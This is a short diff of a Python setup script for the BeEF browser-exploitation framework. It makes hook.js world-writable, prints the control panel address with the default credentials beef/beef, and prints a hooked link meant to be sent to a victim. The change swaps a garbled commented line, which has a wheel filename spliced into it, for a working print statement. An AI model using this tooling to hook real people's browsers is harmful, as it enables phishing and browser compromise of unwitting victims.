@@ -145,7 +145,7 @@ if __name__ == '__main__':
 	os.system("chmod a+rw /var/www/html/hook.js")
 	
 	print(color("\n==================================== RESULT ====================================\n","blue"))
-	#print(textile‑4.0.1‑py3‑none‑any.whlcolor("[+] Access The BeeF Control Panel Using : {}".format(connect_to_panel),"green"))
+	print("[+] Access The BeeF Control Panel Using : {}".format(connect_to_panel))
 	print(color("\t Username = beef\n\t Password = beef\n","blue"))
 	print(color("[+] Hooked Link To Send to Victim  : "+send_to_full,"green"))
 	print(color ('[?]\n\nNote : I know few of the Exploits does not work\n       due to Updated Browsers and stuff...\n\nTip : Change Payload or Images Address to your Connect_to Address with Port 80 \n\t Example : \n\t\t'))
